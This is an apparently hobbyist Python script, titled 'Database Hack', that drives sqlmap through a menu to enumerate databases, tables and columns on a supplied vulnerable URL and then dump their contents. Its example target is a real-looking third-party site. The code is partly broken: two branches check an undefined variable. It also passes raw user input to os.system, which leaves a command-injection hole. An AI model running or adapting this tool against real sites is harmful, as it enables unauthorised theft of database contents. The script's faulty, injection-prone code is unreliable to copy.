#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet Database Hack")
print("""
1) I Only Know The Vulnerability Link.
2) I Know Vulnerability Link, Database Name.
3) I Know Vulnerability Link, Database Name, Table Name.
4) I Know Vulnerability Link, Database Name, Table Name, Colon Name.

Example Vulnerability Link:  : http://www.suesupriano.com/article.php?id=25

""")

proccesno = raw_input("Procces No: ")

if (proccesno == "1"):
	vulnlink = raw_input("Vulnerability Link: ")
	os.system("sqlmap -u " + vulnlink + " --dbs --batch")

elif (proccesno == "2"):
	vulnlink = raw_input("Vulnerability Link: ")
	database = raw_input("Database Name: ")
	os.system("sqlmap -u " + vulnlink + " -D " + database + " --tables --batch")
elif (islemno == "3"):
	vulnlink = raw_input("Vulnerability Link: ")
	database = raw_input("Database Name: ")
	table = raw_input("Table Name: ")
	os.system("sqlmap -u " + vulnlink + " -D " + database + " -T " + table + " --columns --batch")

elif (islemno == "4"):
	vulnlink = raw_input("Vulnerability Name: ")
	database = raw_input("Database Name: ")
	table = raw_input("Table Name: ")
	colon = raw_input("Colon Name: ")
	os.system("sqlmap -u " + vulnlink + " -D " + database + " -T " + table + " -C " + colon + " --dump --batch")	

else:
	print("Wrong choice. Program closing.")